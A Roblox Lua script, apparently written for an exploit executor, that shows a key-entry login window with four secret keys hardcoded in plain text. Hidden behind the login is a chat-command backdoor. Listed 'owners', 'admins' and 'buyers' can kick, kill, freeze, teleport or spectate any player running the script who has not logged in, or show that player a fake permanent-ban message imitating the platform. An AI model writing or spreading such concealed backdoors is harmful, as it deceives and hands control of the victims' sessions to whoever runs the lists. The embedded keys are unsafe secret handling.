local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")

local lp = Players.LocalPlayer
local guiVisible = false
getgenv().Authorized = false

-- Set your access lists here
local owners = {""}       -- Replace with real usernames
local admins = {}
local buyers = {}

-- Secret keys for login
local loginKeys = {
    "testzad",
    "hyperlolz1",
    "Buyerlucas1",
    "Buyerbigtoenail15"
}

-- GUI
local gui = Instance.new("ScreenGui", lp:WaitForChild("PlayerGui"))
gui.Name = "LoginGui"
gui.ResetOnSpawn = false
gui.Enabled = false

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 220, 0, 120)
frame.Position = UDim2.new(0.5, -110, 0.5, -60)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundTransparency = 1
title.Text = "Enter Secret Key"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 18

local textbox = Instance.new("TextBox", frame)
textbox.Size = UDim2.new(1, -20, 0, 30)
textbox.Position = UDim2.new(0, 10, 0, 40)
textbox.PlaceholderText = "Secret Key"
textbox.Text = ""
textbox.TextColor3 = Color3.fromRGB(255, 255, 255)
textbox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
textbox.BorderSizePixel = 0
textbox.Font = Enum.Font.SourceSans
textbox.TextSize = 16
textbox.ClearTextOnFocus = false

local timerLabel = Instance.new("TextLabel", frame)
timerLabel.Size = UDim2.new(1, 0, 0, 20)
timerLabel.Position = UDim2.new(0, 0, 1, -20)
timerLabel.BackgroundTransparency = 1
timerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
timerLabel.Text = "Time left: 20"
timerLabel.Font = Enum.Font.SourceSans
timerLabel.TextSize = 14

-- Notification helper
local function notify(msg)
    StarterGui:SetCore("SendNotification", {
        Title = "Login",
        Text = msg,
        Duration = 3
    })
end

-- GUI logic
local function showLoginGui()
    if guiVisible or getgenv().Authorized then return end
    guiVisible = true
    gui.Enabled = true

    local seconds = 20
    timerLabel.Text = "Time left: " .. seconds

    coroutine.wrap(function()
        while seconds > 0 and gui.Enabled and not getgenv().Authorized do
            wait(1)
            seconds -= 1
            timerLabel.Text = "Time left: " .. seconds
        end
        if not getgenv().Authorized then
            gui:Destroy()
            guiVisible = false
        end
    end)()
end

-- Open GUI keybind
UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == Enum.KeyCode.F1 then
        textbox.Text = ""
        showLoginGui()
    end
end)

-- Mobile users support
lp.Chatted:Connect(function(msg)
    if msg:lower() == ".open" and not getgenv().Authorized then
        textbox.Text = ""
        showLoginGui()
    end
end)

-- Authorization check
local function isAuthorized(player)
    for _, v in ipairs(owners) do if player.Name == v then return true end end
    for _, v in ipairs(admins) do if player.Name == v then return true end end
    for _, v in ipairs(buyers) do if player.Name == v then return true end end
    return false
end

-- Login validation
_G.CheckKey = function(input)
    if getgenv().Authorized then return end
    for _, key in ipairs(loginKeys) do
        if input == key then
            getgenv().Authorized = true
            notify("Login successful!")
            gui:Destroy()
            return
        end
    end
    notify("Invalid key!")
end

-- Key check when textbox loses focus
textbox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        _G.CheckKey(textbox.Text)
    end
end)

-- Admin commands handler
local function hookChat(authUser)
    authUser.Chatted:Connect(function(msg)
        if not msg or getgenv().Authorized then return end

        msg = msg:lower()
        if msg == "/commands" then
            notify("Available: /kick . /bring . /freeze . /unfreeze . /view . /unview . /kill . /ban .")
        elseif msg == "/kick ." then
            lp:Kick("Admins has kicked you.")
        elseif msg == "/bring ." then
            if lp.Character and authUser.Character then
                lp.Character:SetPrimaryPartCFrame(authUser.Character:GetPrimaryPartCFrame())
            end
        elseif msg == "/freeze ." then
            local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
            if hrp then hrp.Anchored = true end
        elseif msg == "/unfreeze ." then
            local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
            if hrp then hrp.Anchored = false end
        elseif msg == "/view ." then
            if authUser.Character then
                lp.CameraMode = Enum.CameraMode.LockFirstPerson
                lp.CameraSubject = authUser.Character:FindFirstChildOfClass("Humanoid")
            end
        elseif msg == "/unview ." then
            lp.CameraMode = Enum.CameraMode.Classic
            lp.CameraSubject = lp.Character:FindFirstChildOfClass("Humanoid")
        elseif msg == "/kill ." then
            local h = lp.Character and lp.Character:FindFirstChild("Humanoid")
            if h then h.Health = 0 end
        elseif msg == "/ban ." then
            lp:Kick("You have been permanently banned from this experience. (Error Code: 267)")
        end
    end)
end

-- Hook any authorized player who joins
local function onPlayerAdded(player)
    if isAuthorized(player) then
        hookChat(player)
    end
end

-- Hook existing authorized players
for _, p in ipairs(Players:GetPlayers()) do
    onPlayerAdded(p)
end

-- Hook new authorized players
Players.PlayerAdded:Connect(onPlayerAdded)
